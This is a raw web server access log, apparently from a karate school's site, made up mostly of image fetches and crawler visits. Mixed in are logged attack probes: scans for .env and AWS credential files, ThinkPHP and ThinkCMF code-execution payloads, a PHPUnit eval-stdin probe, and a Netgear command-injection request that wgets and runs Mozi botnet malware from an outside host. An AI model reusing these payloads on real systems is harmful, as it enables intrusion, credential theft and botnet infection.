::ffff:185.254.196.115 - - [07/Aug/2022:00:09:06 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:174.194.130.179 - - [07/Aug/2022:03:51:19 +0000] "GET /images/schools/martinezkaratedomap.jpg HTTP/1.1" 304 - "http://34.212.47.6/" "Mozilla/5.0 (Linux; Android 12; SM-G996U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"
::ffff:174.194.130.179 - - [07/Aug/2022:03:51:19 +0000] "GET /images/schools/manzanitakaratedomap.jpg HTTP/1.1" 304 - "http://34.212.47.6/" "Mozilla/5.0 (Linux; Android 12; SM-G996U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"
::ffff:174.194.130.179 - - [07/Aug/2022:03:51:19 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://34.212.47.6/" "Mozilla/5.0 (Linux; Android 12; SM-G996U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"
::ffff:174.194.130.179 - - [07/Aug/2022:03:51:23 +0000] "GET /images/tiger.bmp HTTP/1.1" 200 311274 "http://34.212.47.6/" "Mozilla/5.0 (Linux; Android 12; SM-G996U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"
::ffff:174.194.130.179 - - [07/Aug/2022:03:51:26 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 200 35066 "http://34.212.47.6/" "Mozilla/5.0 (Linux; Android 12; SM-G996U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"
::ffff:174.194.130.179 - - [07/Aug/2022:03:51:30 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://34.212.47.6/" "Mozilla/5.0 (Linux; Android 12; SM-G996U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"
::ffff:174.194.130.179 - - [07/Aug/2022:03:51:33 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://34.212.47.6/" "Mozilla/5.0 (Linux; Android 12; SM-G996U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"
::ffff:135.125.246.110 - - [07/Aug/2022:03:52:14 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.110 - - [07/Aug/2022:03:52:15 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:174.194.130.179 - - [07/Aug/2022:03:59:17 +0000] "GET /images/tiger.bmp HTTP/1.1" 200 311274 "http://34.212.47.6/" "Mozilla/5.0 (Linux; Android 12; SM-G996U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"
::ffff:174.194.130.179 - - [07/Aug/2022:03:59:21 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 200 35066 "http://34.212.47.6/" "Mozilla/5.0 (Linux; Android 12; SM-G996U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"
::ffff:173.252.79.24 - - [07/Aug/2022:04:16:24 +0000] "GET /images/karatebook.jpg HTTP/1.1" 404 160 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
::ffff:173.252.87.17 - - [07/Aug/2022:04:18:56 +0000] "GET /images/karatebook.jpg HTTP/1.1" 404 160 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
::ffff:157.55.39.160 - - [07/Aug/2022:04:23:29 +0000] "GET /images/schools/manzanitakaratedomap.jpg HTTP/1.1" 200 55402 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:173.252.87.21 - - [07/Aug/2022:04:23:55 +0000] "GET /images/karatebook.jpg HTTP/1.1" 404 160 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
::ffff:185.7.214.104 - - [07/Aug/2022:04:26:33 +0000] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 190 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:185.196.220.70 - - [07/Aug/2022:04:26:53 +0000] "GET / HTTP/1.1" 200 58071 "-" "Linux Gnu (cow)"
::ffff:173.252.87.7 - - [07/Aug/2022:04:30:43 +0000] "GET /images/karatebook.jpg HTTP/1.1" 404 160 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
::ffff:173.252.107.7 - - [07/Aug/2022:04:30:43 +0000] "GET /images/karatebook.jpg HTTP/1.1" 404 160 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
::ffff:20.22.185.213 - - [07/Aug/2022:04:36:29 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:20.22.185.213 - - [07/Aug/2022:04:36:30 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.115 - - [07/Aug/2022:04:41:01 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.115 - - [07/Aug/2022:04:41:01 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:207.46.13.232 - - [07/Aug/2022:04:41:45 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:207.46.13.42 - - [07/Aug/2022:04:41:54 +0000] "GET /images/marin5thDan.jpeg HTTP/1.1" 200 105451 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:173.252.87.4 - - [07/Aug/2022:04:48:47 +0000] "GET /images/karatebook.jpg HTTP/1.1" 404 160 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
::ffff:218.166.52.80 - - [07/Aug/2022:04:52:52 +0000] "GET / HTTP/1.1" 200 58071 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
::ffff:205.210.31.151 - - [07/Aug/2022:04:57:38 +0000] "GET / HTTP/1.1" 200 58071 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
::ffff:173.252.83.16 - - [07/Aug/2022:05:03:29 +0000] "GET /images/karatebook.jpg HTTP/1.1" 404 160 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
::ffff:173.252.79.119 - - [07/Aug/2022:05:03:29 +0000] "GET /images/karatebook.jpg HTTP/1.1" 404 160 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
::ffff:173.252.87.16 - - [07/Aug/2022:05:04:58 +0000] "GET /images/karatebook.jpg HTTP/1.1" 404 160 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
::ffff:173.252.107.117 - - [07/Aug/2022:05:04:58 +0000] "GET /images/karatebook.jpg HTTP/1.1" 404 160 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
::ffff:107.174.138.159 - - [07/Aug/2022:05:15:07 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Python/3.7 aiohttp/3.7.4.post0"
::ffff:107.174.138.159 - - [07/Aug/2022:05:15:07 +0000] "POST / HTTP/1.1" 404 140 "-" "Python/3.7 aiohttp/3.7.4.post0"
::ffff:135.125.246.110 - - [07/Aug/2022:05:17:23 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.110 - - [07/Aug/2022:05:17:23 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:143.92.32.136 - - [07/Aug/2022:05:24:03 +0000] "GET / HTTP/1.1" 200 58071 "https://www.google.com/search?q=todayad.live" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:143.92.32.136 - - [07/Aug/2022:05:24:03 +0000] "GET / HTTP/1.1" 200 58071 "https://www.google.com/search?q=todayad.live" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:185.7.214.104 - - [07/Aug/2022:05:24:53 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 189 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:157.55.39.33 - - [07/Aug/2022:05:33:48 +0000] "GET /images/schools/manzanitakaratedomap.jpg HTTP/1.1" 200 55402 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:207.46.13.182 - - [07/Aug/2022:05:39:47 +0000] "GET /signup HTTP/1.1" 404 145 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:185.7.214.104 - - [07/Aug/2022:05:46:46 +0000] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:109.237.103.123 - - [07/Aug/2022:06:05:09 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.115 - - [07/Aug/2022:06:05:31 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.115 - - [07/Aug/2022:06:05:32 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:49.12.131.247 - - [07/Aug/2022:06:06:23 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
::ffff:49.12.131.247 - - [07/Aug/2022:06:06:26 +0000] "GET /sitemap HTTP/1.1" 404 146 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
::ffff:49.12.131.247 - - [07/Aug/2022:06:06:29 +0000] "GET /sitemap.txt HTTP/1.1" 404 150 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
::ffff:185.7.214.104 - - [07/Aug/2022:06:26:49 +0000] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 404 148 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:66.249.79.229 - - [07/Aug/2022:06:52:51 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.79.231 - - [07/Aug/2022:06:52:51 +0000] "GET /ads.txt HTTP/1.1" 404 146 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:207.46.13.46 - - [07/Aug/2022:06:55:55 +0000] "GET / HTTP/1.1" 200 58071 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:128.14.209.162 - - [07/Aug/2022:06:59:57 +0000] "GET / HTTP/1.1" 200 58071 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
::ffff:185.7.214.104 - - [07/Aug/2022:07:08:34 +0000] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 58071 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:27.215.81.170 - - [07/Aug/2022:07:10:31 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://27.215.81.170:40826/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 148 "-" "-"
::ffff:114.119.137.232 - - [07/Aug/2022:07:14:03 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:114.119.147.2 - - [07/Aug/2022:07:21:29 +0000] "GET / HTTP/1.1" 200 58071 "http://www.wadokikai.net/contact?s=1&ss=10" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:135.125.246.189 - - [07/Aug/2022:07:21:39 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.189 - - [07/Aug/2022:07:21:40 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:207.46.13.232 - - [07/Aug/2022:07:27:25 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:207.46.13.117 - - [07/Aug/2022:07:27:27 +0000] "GET / HTTP/1.1" 200 58071 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:173.252.87.1 - - [07/Aug/2022:07:30:11 +0000] "GET /images/karatebook.jpg HTTP/1.1" 404 160 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
::ffff:173.252.107.19 - - [07/Aug/2022:07:30:11 +0000] "GET /images/karatebook.jpg HTTP/1.1" 404 160 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
::ffff:185.254.196.115 - - [07/Aug/2022:07:36:57 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.115 - - [07/Aug/2022:07:36:57 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:66.249.79.191 - - [07/Aug/2022:07:40:44 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Googlebot-Image/1.0"
::ffff:207.46.13.117 - - [07/Aug/2022:07:46:48 +0000] "GET / HTTP/1.1" 200 58071 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:20.46.246.38 - - [07/Aug/2022:07:53:07 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:20.46.246.38 - - [07/Aug/2022:07:53:07 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.191.171.40 - - [07/Aug/2022:08:04:02 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
::ffff:185.191.171.1 - - [07/Aug/2022:08:04:02 +0000] "GET /virtual.php HTTP/1.1" 404 150 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
::ffff:185.7.214.104 - - [07/Aug/2022:08:04:17 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 58071 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:163.123.143.71 - - [07/Aug/2022:08:20:09 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 163 "http://34.212.47.6:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
::ffff:20.25.146.215 - - [07/Aug/2022:08:38:16 +0000] "HEAD / HTTP/1.1" 200 58071 "-" "python-requests/2.22.0"
::ffff:20.25.146.215 - - [07/Aug/2022:08:38:16 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11 Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:20.25.146.215 - - [07/Aug/2022:08:38:17 +0000] "GET //vendor/.env HTTP/1.1" 404 151 "-" "Mozilla/5.0 (X11 Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:20.25.146.215 - - [07/Aug/2022:08:38:17 +0000] "GET //.env HTTP/1.1" 404 144 "-" "Mozilla/5.0 (X11 Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:20.25.146.215 - - [07/Aug/2022:08:38:17 +0000] "GET // HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11 Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:20.25.146.215 - - [07/Aug/2022:08:38:17 +0000] "GET //.environment HTTP/1.1" 404 152 "-" "Mozilla/5.0 (X11 Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:20.25.146.215 - - [07/Aug/2022:08:38:17 +0000] "GET //.env.txt HTTP/1.1" 404 148 "-" "Mozilla/5.0 (X11 Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:20.25.146.215 - - [07/Aug/2022:08:38:17 +0000] "GET //env.txt HTTP/1.1" 404 147 "-" "Mozilla/5.0 (X11 Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:20.25.146.215 - - [07/Aug/2022:08:38:17 +0000] "GET //.env.bak HTTP/1.1" 404 148 "-" "Mozilla/5.0 (X11 Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:20.25.146.215 - - [07/Aug/2022:08:38:18 +0000] "GET //.aws/credentials/phpinfo HTTP/1.1" 404 164 "-" "Mozilla/5.0 (X11 Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:20.25.146.215 - - [07/Aug/2022:08:38:18 +0000] "GET //phpinfo.php HTTP/1.1" 404 151 "-" "Mozilla/5.0 (X11 Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:20.25.146.215 - - [07/Aug/2022:08:38:18 +0000] "GET //aws.yml HTTP/1.1" 404 147 "-" "Mozilla/5.0 (X11 Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:20.25.146.215 - - [07/Aug/2022:08:38:18 +0000] "GET //info.php HTTP/1.1" 404 148 "-" "Mozilla/5.0 (X11 Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:20.25.146.215 - - [07/Aug/2022:08:38:18 +0000] "GET //config/aws.yml HTTP/1.1" 404 154 "-" "Mozilla/5.0 (X11 Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:20.25.146.215 - - [07/Aug/2022:08:38:18 +0000] "GET //.env.example HTTP/1.1" 404 152 "-" "Mozilla/5.0 (X11 Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:20.25.146.215 - - [07/Aug/2022:08:38:18 +0000] "GET //.env_old HTTP/1.1" 404 148 "-" "Mozilla/5.0 (X11 Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:20.25.146.215 - - [07/Aug/2022:08:38:19 +0000] "GET //vendor/.env.example HTTP/1.1" 404 159 "-" "Mozilla/5.0 (X11 Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:20.25.146.215 - - [07/Aug/2022:08:38:19 +0000] "GET //core/.env.example HTTP/1.1" 404 157 "-" "Mozilla/5.0 (X11 Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:20.25.146.215 - - [07/Aug/2022:08:38:19 +0000] "GET //config/.env.example HTTP/1.1" 404 159 "-" "Mozilla/5.0 (X11 Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:20.25.146.215 - - [07/Aug/2022:08:38:19 +0000] "GET //app/.env.example HTTP/1.1" 404 156 "-" "Mozilla/5.0 (X11 Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:20.25.146.215 - - [07/Aug/2022:08:38:19 +0000] "GET //web/.env.example HTTP/1.1" 404 156 "-" "Mozilla/5.0 (X11 Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:20.25.146.215 - - [07/Aug/2022:08:38:19 +0000] "GET //public/.env.example HTTP/1.1" 404 159 "-" "Mozilla/5.0 (X11 Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:20.25.146.215 - - [07/Aug/2022:08:38:19 +0000] "GET //en/.env.example HTTP/1.1" 404 155 "-" "Mozilla/5.0 (X11 Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:20.25.146.215 - - [07/Aug/2022:08:38:20 +0000] "GET //laravel/.env.example HTTP/1.1" 404 160 "-" "Mozilla/5.0 (X11 Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:20.25.146.215 - - [07/Aug/2022:08:38:20 +0000] "GET //api/.env.example HTTP/1.1" 404 156 "-" "Mozilla/5.0 (X11 Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:20.25.146.215 - - [07/Aug/2022:08:38:20 +0000] "GET //app/.env.example HTTP/1.1" 404 156 "-" "Mozilla/5.0 (X11 Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:20.25.146.215 - - [07/Aug/2022:08:38:20 +0000] "GET //app/frontend/.env.example HTTP/1.1" 404 165 "-" "Mozilla/5.0 (X11 Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:20.25.146.215 - - [07/Aug/2022:08:38:20 +0000] "GET //application/.env.example HTTP/1.1" 404 164 "-" "Mozilla/5.0 (X11 Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:20.25.146.215 - - [07/Aug/2022:08:38:20 +0000] "GET //awstats/.env.example HTTP/1.1" 404 160 "-" "Mozilla/5.0 (X11 Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:20.25.146.215 - - [07/Aug/2022:08:38:20 +0000] "GET //back-end/app/.env.example HTTP/1.1" 404 165 "-" "Mozilla/5.0 (X11 Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:20.25.146.215 - - [07/Aug/2022:08:38:21 +0000] "GET //backend/.env.example HTTP/1.1" 404 160 "-" "Mozilla/5.0 (X11 Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:20.25.146.215 - - [07/Aug/2022:08:38:21 +0000] "GET //backup/.env.example HTTP/1.1" 404 159 "-" "Mozilla/5.0 (X11 Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:20.25.146.215 - - [07/Aug/2022:08:38:21 +0000] "GET //bootstrap/.env.example HTTP/1.1" 404 162 "-" "Mozilla/5.0 (X11 Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:20.25.146.215 - - [07/Aug/2022:08:38:21 +0000] "GET //build/.env.example HTTP/1.1" 404 158 "-" "Mozilla/5.0 (X11 Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:20.25.146.215 - - [07/Aug/2022:08:38:21 +0000] "GET //core/.env.example HTTP/1.1" 404 157 "-" "Mozilla/5.0 (X11 Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:20.25.146.215 - - [07/Aug/2022:08:38:21 +0000] "GET //data/.env.example HTTP/1.1" 404 157 "-" "Mozilla/5.0 (X11 Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
